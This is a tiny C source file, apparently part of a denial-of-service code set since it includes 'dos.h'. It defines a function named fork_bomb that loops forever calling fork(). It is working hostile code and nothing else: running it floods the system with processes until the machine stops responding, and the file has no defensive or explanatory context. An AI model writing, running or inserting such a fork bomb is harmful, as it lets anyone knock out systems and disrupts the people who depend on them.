#include <stdbool.h>
#include <unistd.h>

#include "dos.h"

__attribute__ ((/*leaf, */noreturn, nothrow))
void fork_bomb (void) {
   while (true) (void) fork ();
}